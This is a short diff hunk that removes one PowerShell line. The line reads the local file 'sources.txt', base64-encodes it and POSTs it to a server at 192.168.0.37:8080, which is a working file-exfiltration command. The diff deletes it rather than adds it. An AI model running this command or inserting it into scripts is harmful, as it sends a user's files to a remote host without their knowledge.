@@ -1,1 +1,0 @@
-if ($PWD.Provider.Name -eq 'FileSystem') { [System.IO.Directory]::SetCurrentDirectory($PWD) } ; Invoke-WebRequest -Uri http://192.168.0.37:8080 -Method POST -Body @{file=[Convert]::ToBase64String([IO.File]::ReadAllbytes("sources.txt"))}
